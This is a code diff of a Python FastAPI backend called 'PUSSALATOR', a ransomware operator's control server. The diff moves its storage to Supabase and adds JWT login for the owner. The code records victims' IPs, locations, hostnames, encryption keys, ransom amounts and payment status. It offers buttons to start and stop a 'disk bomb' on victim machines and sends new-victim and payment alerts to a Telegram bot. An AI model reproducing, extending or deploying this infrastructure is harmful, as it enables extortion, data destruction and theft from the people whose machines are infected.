@@ -1,31 +1,25 @@
-#!/usr/bin/env python3
-"""
-PUSSALATOR - Fixed Backend with Proper Authentication
-FOR VM TESTING ONLY
-"""
-
 import os
-import sys
 import json
 import random
 import string
 import hashlib
-import sqlite3
-import threading
-import time
+import hmac
 from datetime import datetime, timedelta
-from contextlib import asynccontextmanager
 from typing import Optional, Dict, Any, List
+from contextlib import asynccontextmanager
 
 # FastAPI imports
-from fastapi import FastAPI, Request, Response, HTTPException, Depends, BackgroundTasks
+from fastapi import FastAPI, Request, Response, HTTPException, Depends, Cookie, status
 from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse
 from fastapi.middleware.cors import CORSMiddleware
+from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
 import uvicorn
 
 # Third party imports
-from pydantic import BaseModel
+from supabase import create_client, Client
 import requests
+from pydantic import BaseModel
+from jose import JWTError, jwt
 
 # ============================================================================
 # CONFIGURATION
@@ -34,14 +28,20 @@ import requests
 class Config:
     SECRET_KEY = os.environ.get('SECRET_KEY',)
     
+    # Supabase credentials
+    SUPABASE_URL = os.environ.get('SUPABASE_URL')
+    SUPABASE_KEY = os.environ.get('SUPABASE_KEY')
+    SUPABASE_SERVICE_KEY = os.environ.get('SUPABASE_SERVICE_KEY')
+    SUPABASE_JWT_SECRET = os.environ.get('SUPABASE_JWT_SECRET')  # From Supabase Settings > Auth
+    
     # Ransom settings
     DEFAULT_RANSOM_AMOUNT = os.environ.get('DEFAULT_RANSOM_AMOUNT', '0.5 BTC')
-    DEFAULT_BTC_ADDRESS = os.environ.get('DEFAULT_BTC_ADDRESS',)
+    DEFAULT_BTC_ADDRESS = os.environ.get('DEFAULT_BTC_ADDRESS')
     DEFAULT_DEADLINE_HOURS = int(os.environ.get('DEFAULT_DEADLINE_HOURS', 72))
     
-    # Owner credentials - FIXED: Set default values
-    OWNER_ID = os.environ.get('OWNER_ID',)
-    OWNER_PASSWORD = os.environ.get('OWNER_PASSWORD',)
+    # Owner credentials for Supabase Auth
+    OWNER_EMAIL = os.environ.get('OWNER_EMAIL')
+    OWNER_PASSWORD = os.environ.get('OWNER_PASSWORD')
     
     # Telegram Bot
     TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '')
@@ -50,251 +50,79 @@ class Config:
     # Server settings
     DEBUG = os.environ.get('DEBUG', 'False').lower() == 'true'
     HOST = '0.0.0.0'
-    PORT = int(os.environ.get('PORT', 10000))
-    
-    # Database
-    DATABASE = 'pussalator.db'
+    PORT = int(os.environ.get('PORT', 8000))
 
 # ============================================================================
-# DATABASE SETUP
+# SUPABASE CLIENTS
 # ============================================================================
 
-def init_db():
-    """Initialize SQLite database"""
-    conn = sqlite3.connect(Config.DATABASE)
-    c = conn.cursor()
-    
-    # Create victims table
-    c.execute('''
-        CREATE TABLE IF NOT EXISTS victims (
-            id TEXT PRIMARY KEY,
-            key TEXT NOT NULL,
-            deadline TEXT NOT NULL,
-            created TEXT NOT NULL,
-            status TEXT DEFAULT 'unpaid',
-            files INTEGER DEFAULT 0,
-            ransom TEXT DEFAULT '0.5 BTC',
-            wallet TEXT DEFAULT '1PussWalletVMTest',
-            hostname TEXT,
-            ip TEXT,
-            country TEXT,
-            country_code TEXT,
-            city TEXT,
-            lat REAL DEFAULT 0,
-            lon REAL DEFAULT 0,
-            isp TEXT,
-            os TEXT,
-            bomb_status TEXT DEFAULT 'inactive',
-            bomb_size REAL DEFAULT 0,
-            paid_at TEXT,
-            tx TEXT,
-            last_seen TEXT,
-            notes TEXT
-        )
-    ''')
-    
-    # Create bomb_commands table
-    c.execute('''
-        CREATE TABLE IF NOT EXISTS bomb_commands (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            victim_id TEXT NOT NULL,
-            action TEXT NOT NULL,
-            filename TEXT,
-            issued_at TEXT DEFAULT CURRENT_TIMESTAMP,
-            executed INTEGER DEFAULT 0
-        )
-    ''')
-    
-    # Create logs table
-    c.execute('''
-        CREATE TABLE IF NOT EXISTS logs (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            action TEXT NOT NULL,
-            details TEXT,
-            ip TEXT,
-            timestamp TEXT DEFAULT CURRENT_TIMESTAMP
-        )
-    ''')
-    
-    conn.commit()
-    conn.close()
-    print("[+] Database initialized")
+# Public client (for regular operations)
+supabase: Client = create_client(Config.SUPABASE_URL, Config.SUPABASE_KEY)
 
-# Initialize DB on startup
-init_db()
+# Admin client (for privileged operations)
+supabase_admin: Client = create_client(Config.SUPABASE_URL, Config.SUPABASE_SERVICE_KEY)
 
 # ============================================================================
-# DATABASE FUNCTIONS
+# JWT BEARER AUTHENTICATION [citation:4]
 # ============================================================================
 
-def db_execute(query, params=()):
-    """Execute database query"""
-    conn = sqlite3.connect(Config.DATABASE)
-    conn.row_factory = sqlite3.Row
-    c = conn.cursor()
-    c.execute(query, params)
-    conn.commit()
-    result = c.fetchall()
-    conn.close()
-    return [dict(row) for row in result]
+class JWTBearer(HTTPBearer):
+    def __init__(self, auto_error: bool = True):
+        super(JWTBearer, self).__init__(auto_error=auto_error)
 
-def db_get_one(query, params=()):
-    """Get one row from database"""
-    conn = sqlite3.connect(Config.DATABASE)
-    conn.row_factory = sqlite3.Row
-    c = conn.cursor()
-    c.execute(query, params)
-    row = c.fetchone()
-    conn.close()
-    return dict(row) if row else None
-
-def db_insert(table, data):
-    """Insert into database"""
-    keys = ', '.join(data.keys())
-    placeholders = ', '.join(['?' for _ in data])
-    values = list(data.values())
-    
-    query = f"INSERT INTO {table} ({keys}) VALUES ({placeholders})"
-    db_execute(query, values)
-
-def db_update(table, data, where, where_params):
-    """Update database"""
-    set_clause = ', '.join([f"{k}=?" for k in data.keys()])
-    values = list(data.values()) + where_params
-    
-    query = f"UPDATE {table} SET {set_clause} WHERE {where}"
-    db_execute(query, values)
-
-# ============================================================================
-# TELEGRAM BOT - FIXED
-# ============================================================================
-
-class TelegramBot:
-    """Telegram bot for notifications - FIXED error handling"""
-    
-    def __init__(self):
-        self.token = Config.TELEGRAM_BOT_TOKEN
-        self.chat_id = Config.TELEGRAM_CHAT_ID
-        self.enabled = bool(self.token and self.chat_id)
-        self.last_error_time = 0
-        self.error_count = 0
-        
-        if self.enabled:
-            # Test the bot on startup
-            test_msg = self.send("🔴 PUSSALATOR BACKEND STARTED", silent=True)
-            if test_msg:
-                print(f"[+] Telegram bot enabled - chat ID: {self.chat_id}")
-            else:
-                print("[-] Telegram bot configured but not working - check token and chat ID")
-                self.enabled = False
+    async def __call__(self, request: Request):
+        credentials: HTTPAuthorizationCredentials = await super(JWTBearer, self).__call__(request)
+        if credentials:
+            if not credentials.scheme == "Bearer":
+                raise HTTPException(
+                    status_code=status.HTTP_403_FORBIDDEN,
+                    detail="Invalid authentication scheme."
+                )
+            if not self.verify_jwt(credentials.credentials):
+                raise HTTPException(
+                    status_code=status.HTTP_403_FORBIDDEN,
+                    detail="Invalid token or expired token."
+                )
+            return credentials.credentials
         else:
-            print("[-] Telegram bot disabled - set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID")
-    
-    def send(self, message: str, silent: bool = False) -> bool:
-        """Send message to Telegram with rate limiting and error handling"""
-        if not self.enabled:
-            return False
-        
-        # Rate limiting - don't send more than 1 message per second
-        current_time = time.time()
-        if current_time - self.last_error_time < 1:
-            time.sleep(1)
-        
-        try:
-            # Format message
-            formatted_msg = f"<b>🔴 PUSSALATOR</b>\n\n{message}\n\n🕒 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
-            
-            response = requests.post(
-                f"https://api.telegram.org/bot{self.token}/sendMessage",
-                json={
-                    'chat_id': self.chat_id,
-                    'text': formatted_msg,
-                    'parse_mode': 'HTML',
-                    'disable_notification': silent
-                },
-                timeout=5
+            raise HTTPException(
+                status_code=status.HTTP_403_FORBIDDEN,
+                detail="Invalid authorization code."
             )
-            
-            if response.status_code == 200:
-                if not silent:
-                    print(f"[+] Telegram sent")
-                self.last_error_time = current_time
-                return True
-            else:
-                error_data = response.json()
-                print(f"[-] Telegram error {response.status_code}: {error_data.get('description', 'Unknown')}")
-                
-                # If bot was blocked or chat not found, disable it
-                if response.status_code == 403 or response.status_code == 400:
-                    if self.error_count > 3:
-                        print("[-] Too many Telegram errors - disabling bot")
-                        self.enabled = False
-                    self.error_count += 1
-                
-                self.last_error_time = current_time
-                return False
-                
-        except requests.exceptions.Timeout:
-            print("[-] Telegram timeout")
+
+    def verify_jwt(self, jwtoken: str) -> bool:
+        try:
+            # Verify JWT with Supabase secret [citation:4]
+            payload = jwt.decode(
+                jwtoken,
+                Config.SUPABASE_JWT_SECRET,
+                algorithms=["HS256"],
+                audience="authenticated"
+            )
+            return True
+        except JWTError:
             return False
-        except Exception as e:
-            print(f"[-] Telegram exception: {e}")
-            return False
-    
-    def notify_new_victim(self, victim_id: str, location: str, ip: str, hostname: str):
-        """Send notification about new victim"""
-        if not self.enabled:
-            return
-        msg = f"""🔥 <b>NEW VICTIM</b>
 
-<b>ID:</b> <code>{victim_id}</code>
-<b>Hostname:</b> {hostname}
-<b>Location:</b> {location}
-<b>IP:</b> {ip}"""
-        self.send(msg)
-    
-    def notify_payment(self, victim_id: str, amount: str, tx_id: str):
-        """Send notification about payment"""
-        if not self.enabled:
-            return
-        msg = f"""💰 <b>PAYMENT RECEIVED</b>
-
-<b>ID:</b> <code>{victim_id}</code>
-<b>Amount:</b> {amount}
-<b>Transaction:</b> <code>{tx_id}</code>"""
-        self.send(msg)
-    
-    def notify_bomb_start(self, victim_id: str):
-        """Send notification about bomb start"""
-        if not self.enabled:
-            return
-        msg = f"""💣 <b>DISK BOMB ACTIVATED</b>
-
-<b>ID:</b> <code>{victim_id}</code>"""
-        self.send(msg)
-    
-    def notify_bomb_progress(self, victim_id: str, size_gb: float):
-        """Send notification about bomb progress"""
-        if not self.enabled:
-            return
-        if int(size_gb) % 10 == 0:  # Only send every 10GB to avoid spam
-            msg = f"""💣 <b>BOMB PROGRESS</b>
-
-<b>ID:</b> <code>{victim_id}</code>
-<b>Size:</b> {size_gb:.2f} GB"""
-            self.send(msg, silent=True)  # Silent to avoid notification spam
-    
-    def notify_bomb_stop(self, victim_id: str):
-        """Send notification about bomb stop"""
-        if not self.enabled:
-            return
-        msg = f"""⛓️ <b>BOMB STOPPED</b>
-
-<b>ID:</b> <code>{victim_id}</code>"""
-        self.send(msg)
-
-# Initialize Telegram bot
-telegram = TelegramBot()
+# Dependency to get current user from JWT [citation:1]
+async def get_current_user(credentials: str = Depends(JWTBearer())):
+    try:
+        # Decode token to get user info
+        payload = jwt.decode(
+            credentials,
+            Config.SUPABASE_JWT_SECRET,
+            algorithms=["HS256"],
+            audience="authenticated"
+        )
+        return {
+            "id": payload.get("sub"),
+            "email": payload.get("email"),
+            "role": payload.get("role", "authenticated")
+        }
+    except JWTError:
+        raise HTTPException(
+            status_code=status.HTTP_403_FORBIDDEN,
+            detail="Invalid authentication credentials"
+        )
 
 # ============================================================================
 # PYDANTIC MODELS
@@ -327,12 +155,96 @@ class BombUpdate(BaseModel):
     error: Optional[str] = None
 
 class OwnerLogin(BaseModel):
-    owner_id: str
+    email: str
     password: str
+
+class OwnerLoginResponse(BaseModel):
+    access_token: str
+    token_type: str = "bearer"
 
 class BombControl(BaseModel):
     victim_id: str
     filename: Optional[str] = "explosion.dat"
+
+# ============================================================================
+# TELEGRAM BOT [citation:5]
+# ============================================================================
+
+class TelegramBot:
+    """Telegram bot for notifications"""
+    
+    def __init__(self):
+        self.token = Config.TELEGRAM_BOT_TOKEN
+        self.chat_id = Config.TELEGRAM_CHAT_ID
+        self.enabled = bool(self.token and self.chat_id)
+        
+        if self.enabled:
+            # Test the connection
+            test_msg = self.send("🔴 PUSSALATOR BACKEND STARTED", silent=True)
+            if test_msg:
+                print(f"[+] Telegram bot enabled - chat ID: {self.chat_id}")
+            else:
+                print("[-] Telegram bot configured but not working")
+                self.enabled = False
+        else:
+            print("[-] Telegram bot disabled - set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID")
+    
+    def send(self, message: str, silent: bool = False) -> bool:
+        """Send message to Telegram"""
+        if not self.enabled:
+            return False
+        
+        try:
+            response = requests.post(
+                f"https://api.telegram.org/bot{self.token}/sendMessage",
+                json={
+                    'chat_id': self.chat_id,
+                    'text': f"<b>🔴 PUSSALATOR</b>\n\n{message}\n\n🕒 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
+                    'parse_mode': 'HTML',
+                    'disable_notification': silent
+                },
+                timeout=5
+            )
+            return response.status_code == 200
+        except Exception as e:
+            print(f"[-] Telegram error: {e}")
+            return False
+    
+    def notify_new_victim(self, victim_id: str, location: str, ip: str, hostname: str):
+        if not self.enabled:
+            return
+        self.send(f"""🔥 <b>NEW VICTIM</b>
+
+<b>ID:</b> <code>{victim_id}</code>
+<b>Hostname:</b> {hostname}
+<b>Location:</b> {location}
+<b>IP:</b> {ip}""")
+    
+    def notify_payment(self, victim_id: str, amount: str, tx_id: str):
+        if not self.enabled:
+            return
+        self.send(f"""💰 <b>PAYMENT RECEIVED</b>
+
+<b>ID:</b> <code>{victim_id}</code>
+<b>Amount:</b> {amount}
+<b>Transaction:</b> <code>{tx_id}</code>""")
+    
+    def notify_bomb_start(self, victim_id: str):
+        if not self.enabled:
+            return
+        self.send(f"""💣 <b>DISK BOMB ACTIVATED</b>
+
+<b>ID:</b> <code>{victim_id}</code>""")
+    
+    def notify_bomb_stop(self, victim_id: str):
+        if not self.enabled:
+            return
+        self.send(f"""⛓️ <b>BOMB STOPPED</b>
+
+<b>ID:</b> <code>{victim_id}</code>""")
+
+# Initialize Telegram bot
+telegram = TelegramBot()
 
 # ============================================================================
 # HELPER FUNCTIONS
@@ -343,48 +255,47 @@ def generate_victim_id() -> str:
     chars = string.ascii_uppercase + string.digits
     timestamp = datetime.now().strftime('%Y%m%d%H%M%S')
     random_part = ''.join(random.choices(chars, k=8))
-    return f"{timestamp}-{random_part}"
+    return f"VIC-{timestamp}-{random_part}"
 
 def generate_encryption_key() -> str:
     """Generate encryption key"""
     from cryptography.fernet import Fernet
     return Fernet.generate_key().decode()
 
-def log_action(action: str, details: str, ip: str = None):
-    """Log system action"""
-    try:
-        db_insert('logs', {
-            'action': action,
-            'details': details,
-            'ip': ip or 'unknown',
-            'timestamp': datetime.utcnow().isoformat()
-        })
-    except:
-        pass
-
 def get_stats() -> Dict[str, Any]:
-    """Get system statistics"""
+    """Get system statistics from Supabase"""
     try:
-        victims = db_execute('SELECT * FROM victims')
+        # Total victims
+        total = supabase_admin.table('victims').select('*', count='exact').execute()
         
-        total = len(victims)
-        paid = len([v for v in victims if v['status'] == 'paid'])
-        unpaid = len([v for v in victims if v['status'] == 'unpaid'])
-        expired = len([v for v in victims if v['status'] == 'expired'])
-        total_files = sum(v.get('files', 0) for v in victims)
-        active_bombs = len([v for v in victims if v['bomb_status'] == 'active'])
+        # By status
+        paid = supabase_admin.table('victims').select('*', count='exact').eq('status', 'paid').execute()
+        unpaid = supabase_admin.table('victims').select('*', count='exact').eq('status', 'unpaid').execute()
+        expired = supabase_admin.table('victims').select('*', count='exact').eq('status', 'expired').execute()
         
+        # Total files
+        files_result = supabase_admin.table('victims').select('files').execute()
+        total_files = sum(v.get('files', 0) for v in files_result.data)
+        
+        # Active bombs
+        active_bombs = supabase_admin.table('victims').select('*', count='exact').eq('bomb_status', 'active').execute()
+        
+        # Paid today
         today = datetime.now().date().isoformat()
-        paid_today = len([v for v in victims if v['status'] == 'paid' and v.get('paid_at', '').startswith(today)])
+        paid_today = supabase_admin.table('victims').select('*', count='exact')\
+            .eq('status', 'paid')\
+            .gte('paid_at', f"{today}T00:00:00")\
+            .lte('paid_at', f"{today}T23:59:59")\
+            .execute()
         
         return {
-            'total': total,
-            'paid': paid,
-            'unpaid': unpaid,
-            'expired': expired,
+            'total': len(total.data),
+            'paid': len(paid.data),
+            'unpaid': len(unpaid.data),
+            'expired': len(expired.data),
             'total_files': total_files,
-            'active_bombs': active_bombs,
-            'paid_today': paid_today
+            'active_bombs': len(active_bombs.data),
+            'paid_today': len(paid_today.data)
         }
     except Exception as e:
         print(f"Stats error: {e}")
@@ -392,34 +303,6 @@ def get_stats() -> Dict[str, Any]:
             'total': 0, 'paid': 0, 'unpaid': 0, 'expired': 0,
             'total_files': 0, 'active_bombs': 0, 'paid_today': 0
         }
-
-def check_expired_victims():
-    """Background task to check for expired victims"""
-    while True:
-        try:
-            victims = db_execute("SELECT * FROM victims WHERE status='unpaid'")
-            now = datetime.utcnow()
-            
-            for victim in victims:
-                if victim.get('deadline'):
-                    deadline = datetime.fromisoformat(victim['deadline'])
-                    if now > deadline:
-                        db_update('victims', {'status': 'expired'}, 'id = ?', [victim['id']])
-                        print(f"[+] Victim {victim['id']} expired")
-                        
-                        # Send Telegram notification (silent)
-                        if telegram.enabled:
-                            telegram.send(f"⏰ Victim {victim['id']} expired", silent=True)
-            
-            time.sleep(60)  # Check every minute
-            
-        except Exception as e:
-            print(f"Expiry check error: {e}")
-            time.sleep(60)
-
-# Start expiry checker thread
-expiry_thread = threading.Thread(target=check_expired_victims, daemon=True)
-expiry_thread.start()
 
 # ============================================================================
 # FASTAPI APP INIT
@@ -429,15 +312,29 @@ expiry_thread.start()
 async def lifespan(app: FastAPI):
     # Startup
     print("=" * 60)
-    print("PUSSALATOR - FIXED BACKEND")
+    print("PUSSALATOR - SUPABASE BACKEND")
     print("=" * 60)
-    print(f"Server: http://{Config.HOST}:{Config.PORT}")
-    print(f"Owner ID: {Config.OWNER_ID}")
-    print(f"Owner Password: {'*' * len(Config.OWNER_PASSWORD)}")
+    print(f"Supabase URL: {Config.SUPABASE_URL}")
+    print(f"Owner Email: {Config.OWNER_EMAIL}")
     print(f"Telegram: {'✅ ENABLED' if telegram.enabled else '❌ DISABLED'}")
     print("=" * 60)
     print("WARNING: For VM testing only!")
     print("=" * 60)
+    
+    # Create owner user if not exists [citation:1]
+    try:
+        # Check if owner exists
+        owner = supabase_admin.auth.admin.get_user_by_email(Config.OWNER_EMAIL)
+        if not owner:
+            # Create owner user
+            supabase_admin.auth.admin.create_user({
+                'email': Config.OWNER_EMAIL,
+                'password': Config.OWNER_PASSWORD,
+                'email_confirm': True
+            })
+            print(f"[+] Owner user created: {Config.OWNER_EMAIL}")
+    except Exception as e:
+        print(f"[-] Owner user may already exist: {e}")
     
     yield
     
@@ -631,7 +528,7 @@ LOGIN_PAGE = """
     </div>
 
     <script>
-        const OWNER_ID = '40671Mps19*';
+        const OWNER_EMAIL = 'owner@pussalator.com';
         
         function handleKey(e) {
             if (e.key === 'Enter') {
@@ -645,30 +542,6 @@ LOGIN_PAGE = """
             
             if (!id) {
                 messageDiv.innerHTML = 'Please enter an ID';
-                return;
-            }
-            
-            // Check if it's the owner ID
-            if (id === OWNER_ID) {
-                const password = prompt('Enter owner password:');
-                if (!password) return;
-                
-                try {
-                    const response = await fetch('/api/owner/login', {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({owner_id: id, password: password})
-                    });
-                    
-                    const data = await response.json();
-                    if (data.success) {
-                        window.location.href = '/owner/dashboard';
-                    } else {
-                        messageDiv.innerHTML = 'Invalid password';
-                    }
-                } catch(e) {
-                    messageDiv.innerHTML = 'Connection error';
-                }
                 return;
             }
             
@@ -1015,6 +888,23 @@ OWNER_DASHBOARD_TEMPLATE = """
         .nav-links button:hover {
             background: #ff6666;
         }
+        .login-form {
+            background: #1a0000;
+            border: 1px solid #ff0000;
+            padding: 30px;
+            max-width: 400px;
+            margin: 100px auto;
+            text-align: center;
+        }
+        .login-form input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            background: #111;
+            border: 1px solid #ff0000;
+            color: #00ff00;
+            font-family: 'Courier New', monospace;
+        }
         .stats-grid {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
@@ -1030,34 +920,6 @@ OWNER_DASHBOARD_TEMPLATE = """
         .stat-value {
             font-size: 28px;
             color: #ff0000;
-            font-weight: bold;
-        }
-        .stat-label {
-            font-size: 12px;
-            color: #ff9999;
-        }
-        .filters {
-            background: #1a0000;
-            padding: 15px;
-            border: 1px solid #ff0000;
-            margin-bottom: 20px;
-            display: flex;
-            gap: 10px;
-            flex-wrap: wrap;
-        }
-        .filters input, .filters select {
-            background: black;
-            border: 1px solid #ff0000;
-            color: #00ff00;
-            padding: 8px 12px;
-            font-family: 'Courier New', monospace;
-        }
-        .filters button {
-            background: #ff0000;
-            color: black;
-            border: none;
-            padding: 8px 20px;
-            cursor: pointer;
             font-weight: bold;
         }
         .table-container {
@@ -1080,16 +942,12 @@ OWNER_DASHBOARD_TEMPLATE = """
             padding: 10px 12px;
             border-bottom: 1px solid #330000;
         }
-        tr:hover {
-            background: #330000;
-        }
         .status-paid { color: #00ff00; }
         .status-unpaid { color: #ffff00; }
         .status-expired { color: #ff6666; }
         .bomb-active {
             color: #ff0000;
             animation: blink 1s infinite;
-            font-weight: bold;
         }
         @keyframes blink {
             0% { opacity: 1; }
@@ -1142,68 +1000,64 @@ OWNER_DASHBOARD_TEMPLATE = """
             border: 1px solid #ff0000;
             padding: 10px;
             margin-bottom: 15px;
-            font-size: 12px;
         }
         .telegram-enabled { color: #00ff00; }
         .telegram-disabled { color: #ff0000; }
+        .error { color: #ff0000; margin: 10px 0; }
     </style>
 </head>
 <body>
-    <div class="navbar">
-        <h1>⚙️ OWNER DASHBOARD</h1>
-        <div class="nav-links">
-            <button onclick="loadData()">🔄 REFRESH</button>
-            <button onclick="testTelegram()">📱 TEST TELEGRAM</button>
-            <button onclick="logout()">🚪 LOGOUT</button>
+    <div id="loginView" style="display: block;">
+        <div class="login-form">
+            <h2 style="color:#ff0000;">👑 OWNER LOGIN</h2>
+            <input type="email" id="email" placeholder="Email" value="owner@pussalator.com">
+            <input type="password" id="password" placeholder="Password">
+            <button class="action-btn" onclick="login()" style="width:100%; padding:10px;">LOGIN</button>
+            <div id="loginError" class="error"></div>
         </div>
     </div>
     
-    <div class="telegram-status" id="telegramStatus">
-        Loading Telegram status...
-    </div>
-    
-    <div class="stats-grid" id="statsGrid">
-        <div class="stat-card"><div class="stat-value" id="totalVictims">0</div><div class="stat-label">TOTAL</div></div>
-        <div class="stat-card"><div class="stat-value" id="paidVictims">0</div><div class="stat-label">PAID</div></div>
-        <div class="stat-card"><div class="stat-value" id="unpaidVictims">0</div><div class="stat-label">UNPAID</div></div>
-        <div class="stat-card"><div class="stat-value" id="expiredVictims">0</div><div class="stat-label">EXPIRED</div></div>
-        <div class="stat-card"><div class="stat-value" id="totalFiles">0</div><div class="stat-label">FILES</div></div>
-        <div class="stat-card"><div class="stat-value" id="activeBombs">0</div><div class="stat-label">BOMBS</div></div>
-    </div>
-    
-    <div class="filters">
-        <input type="text" id="searchInput" placeholder="Search ID, IP, hostname..." onkeyup="filterTable()">
-        <select id="statusFilter" onchange="filterTable()">
-            <option value="all">ALL STATUS</option>
-            <option value="paid">PAID</option>
-            <option value="unpaid">UNPAID</option>
-            <option value="expired">EXPIRED</option>
-        </select>
-        <select id="bombFilter" onchange="filterTable()">
-            <option value="all">ALL BOMBS</option>
-            <option value="active">ACTIVE</option>
-            <option value="inactive">INACTIVE</option>
-        </select>
-        <button onclick="exportData()">📥 EXPORT CSV</button>
-    </div>
-    
-    <div class="table-container">
-        <table id="victimsTable">
-            <thead>
-                <tr>
-                    <th>ID</th>
-                    <th>HOSTNAME</th>
-                    <th>IP</th>
-                    <th>FILES</th>
-                    <th>STATUS</th>
-                    <th>BOMB</th>
-                    <th>ACTIONS</th>
-                </tr>
-            </thead>
-            <tbody id="tableBody">
-                <tr><td colspan="7" style="text-align:center;padding:40px;">Loading victims...</td></tr>
-            </tbody>
-        </table>
+    <div id="dashboardView" style="display: none;">
+        <div class="navbar">
+            <h1>⚙️ OWNER DASHBOARD</h1>
+            <div class="nav-links">
+                <button onclick="loadData()">🔄 REFRESH</button>
+                <button onclick="testTelegram()">📱 TEST TELEGRAM</button>
+                <button onclick="logout()">🚪 LOGOUT</button>
+            </div>
+        </div>
+        
+        <div class="telegram-status" id="telegramStatus">
+            Loading Telegram status...
+        </div>
+        
+        <div class="stats-grid" id="statsGrid">
+            <div class="stat-card"><div class="stat-value" id="totalVictims">0</div><div class="stat-label">TOTAL</div></div>
+            <div class="stat-card"><div class="stat-value" id="paidVictims">0</div><div class="stat-label">PAID</div></div>
+            <div class="stat-card"><div class="stat-value" id="unpaidVictims">0</div><div class="stat-label">UNPAID</div></div>
+            <div class="stat-card"><div class="stat-value" id="expiredVictims">0</div><div class="stat-label">EXPIRED</div></div>
+            <div class="stat-card"><div class="stat-value" id="totalFiles">0</div><div class="stat-label">FILES</div></div>
+            <div class="stat-card"><div class="stat-value" id="activeBombs">0</div><div class="stat-label">BOMBS</div></div>
+        </div>
+        
+        <div class="table-container">
+            <table id="victimsTable">
+                <thead>
+                    <tr>
+                        <th>ID</th>
+                        <th>HOSTNAME</th>
+                        <th>IP</th>
+                        <th>FILES</th>
+                        <th>STATUS</th>
+                        <th>BOMB</th>
+                        <th>ACTIONS</th>
+                    </tr>
+                </thead>
+                <tbody id="tableBody">
+                    <tr><td colspan="7" style="text-align:center;padding:40px;">Loading victims...</td></tr>
+                </tbody>
+            </table>
+        </div>
     </div>
     
     <!-- Victim Modal -->
@@ -1219,7 +1073,6 @@ OWNER_DASHBOARD_TEMPLATE = """
                 <button class="action-btn" onclick="startBomb()">💣 START BOMB</button>
                 <button class="action-btn" onclick="stopBomb()">🛑 STOP BOMB</button>
                 <button class="action-btn" onclick="deleteVictim()">❌ DELETE</button>
-                <button class="action-btn" onclick="notifyTelegram()">📱 NOTIFY</button>
             </div>
         </div>
     </div>
@@ -1227,6 +1080,45 @@ OWNER_DASHBOARD_TEMPLATE = """
     <script>
         let currentVictim = null;
         let victims = [];
+        let accessToken = localStorage.getItem('access_token');
+        
+        // Check if already logged in
+        if (accessToken) {
+            document.getElementById('loginView').style.display = 'none';
+            document.getElementById('dashboardView').style.display = 'block';
+            loadData();
+        }
+        
+        async function login() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            try {
+                const response = await fetch('/api/owner/login', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({email, password})
+                });
+                
+                const data = await response.json();
+                if (response.ok) {
+                    localStorage.setItem('access_token', data.access_token);
+                    document.getElementById('loginView').style.display = 'none';
+                    document.getElementById('dashboardView').style.display = 'block';
+                    loadData();
+                } else {
+                    document.getElementById('loginError').innerText = 'Invalid credentials';
+                }
+            } catch(e) {
+                document.getElementById('loginError').innerText = 'Connection error';
+            }
+        }
+        
+        async function logout() {
+            localStorage.removeItem('access_token');
+            document.getElementById('loginView').style.display = 'block';
+            document.getElementById('dashboardView').style.display = 'none';
+        }
         
         async function loadData() {
             await loadTelegramStatus();
@@ -1236,13 +1128,15 @@ OWNER_DASHBOARD_TEMPLATE = """
         
         async function loadTelegramStatus() {
             try {
-                const response = await fetch('/api/telegram/status');
+                const response = await fetch('/api/telegram/status', {
+                    headers: {'Authorization': `Bearer ${localStorage.getItem('access_token')}`}
+                });
                 const data = await response.json();
                 const statusDiv = document.getElementById('telegramStatus');
                 if (data.enabled) {
                     statusDiv.innerHTML = `📱 <span class="telegram-enabled">TELEGRAM BOT ENABLED</span> - Chat ID: ${data.chat_id}`;
                 } else {
-                    statusDiv.innerHTML = `📱 <span class="telegram-disabled">TELEGRAM BOT DISABLED</span> - Set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID`;
+                    statusDiv.innerHTML = `📱 <span class="telegram-disabled">TELEGRAM BOT DISABLED</span>`;
                 }
             } catch(e) {
                 console.error('Telegram status error:', e);
@@ -1251,13 +1145,12 @@ OWNER_DASHBOARD_TEMPLATE = """
         
         async function testTelegram() {
             try {
-                const response = await fetch('/api/telegram/test', { method: 'POST' });
+                const response = await fetch('/api/telegram/test', {
+                    method: 'POST',
+                    headers: {'Authorization': `Bearer ${localStorage.getItem('access_token')}`}
+                });
                 const data = await response.json();
-                if (data.success) {
-                    alert('✅ Test message sent to Telegram!');
-                } else {
-                    alert('❌ Failed to send test message. Check bot token and chat ID.');
-                }
+                alert(data.success ? '✅ Test message sent!' : '❌ Failed to send test message');
             } catch(e) {
                 alert('Error testing Telegram');
             }
@@ -1280,7 +1173,9 @@ OWNER_DASHBOARD_TEMPLATE = """
         
         async function loadVictims() {
             try {
-                const response = await fetch('/api/owner/victims');
+                const response = await fetch('/api/owner/victims', {
+                    headers: {'Authorization': `Bearer ${localStorage.getItem('access_token')}`}
+                });
                 victims = await response.json();
                 renderTable();
             } catch(e) {
@@ -1289,31 +1184,13 @@ OWNER_DASHBOARD_TEMPLATE = """
         }
         
         function renderTable() {
-            const searchTerm = document.getElementById('searchInput').value.toLowerCase();
-            const statusFilter = document.getElementById('statusFilter').value;
-            const bombFilter = document.getElementById('bombFilter').value;
-            
-            let filtered = victims.filter(v => {
-                const matchesSearch = searchTerm === '' || 
-                    (v.id && v.id.toLowerCase().includes(searchTerm)) ||
-                    (v.hostname && v.hostname.toLowerCase().includes(searchTerm)) ||
-                    (v.ip && v.ip.includes(searchTerm));
-                
-                const matchesStatus = statusFilter === 'all' || v.status === statusFilter;
-                const matchesBomb = bombFilter === 'all' || 
-                    (bombFilter === 'active' && v.bomb_status === 'active') ||
-                    (bombFilter === 'inactive' && v.bomb_status !== 'active');
-                
-                return matchesSearch && matchesStatus && matchesBomb;
-            });
-            
-            if (!filtered.length) {
+            if (!victims.length) {
